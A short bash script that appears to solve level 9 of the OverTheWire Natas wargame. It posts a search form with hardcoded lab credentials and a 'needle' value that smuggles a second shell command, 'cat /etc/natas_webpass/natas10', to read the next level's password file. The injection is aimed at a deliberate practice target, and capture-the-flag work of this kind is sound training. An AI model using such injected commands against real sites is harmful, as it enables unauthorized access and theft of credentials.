#!/usr/bin/bash

curl -s -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl --data "needle=win; cat /etc/natas_webpass/natas10&submit=search" http://natas9.natas.labs.overthewire.org | head -n 21 | tail -1

